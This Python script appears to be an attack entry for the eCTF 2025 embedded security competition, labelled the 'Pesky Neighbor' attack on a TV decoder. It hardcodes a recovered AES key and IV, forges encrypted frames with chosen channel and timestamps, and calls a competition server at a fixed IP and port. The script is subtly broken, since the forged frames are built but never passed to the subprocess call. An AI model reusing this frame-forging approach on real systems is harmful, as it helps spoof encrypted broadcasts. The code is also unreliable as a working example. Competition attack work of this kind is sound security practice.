import time
import sys
import struct
from ectf25.utils.decoder import DecoderIntf
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
import subprocess

# Encryption Key and IV from recording_back.py
aes_key = bytes.fromhex("24f6754364b954cfb33671c831da582edb88b942442357d9c95ae94e9f8fe20d")
cbc_iv = bytes.fromhex("c6d30c124fbe47e86a02fc2a64b230bf")

def encrypt_frame(channel: int, timestamp: int, data: bytes) -> bytes:
    """Encrypts a frame with AES-CBC."""
    padder = PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    # Frame format: Channel (4 bytes) + Reserved (4 bytes) + Timestamp (8 bytes) + Data + Padding
    frame = struct.pack("<I4xQ", channel, timestamp) + padded_data
    
    # Encrypt the frame
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(cbc_iv))
    encryptor = cipher.encryptor()
    encrypted_frame = encryptor.update(frame) + encryptor.finalize()
    
    return encrypted_frame

if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    
    # Serial port from argument (decoder connection)
    decoder_port = sys.argv[1]
    
    # Channel 1
    channel = 1
    start_timestamp = 1888365551233585
    frame_count = 10
    
    for i in range(frame_count):
        timestamp = start_timestamp + (i * 1000)  # Increment timestamps
        fake_data = b"PeskyDataFrame"  # Placeholder data
        encrypted_frame = encrypt_frame(channel, timestamp, fake_data)
        
        print(f"Sending encrypted frame {i+1} with timestamp {timestamp}")
        
        # Use the TV module to send frames
        subprocess.run(["python", "-m", "ectf25.tv.run", "34.235.112.89", "26001", decoder_port], check=True)
    
    print("Pesky Neighbor attack complete")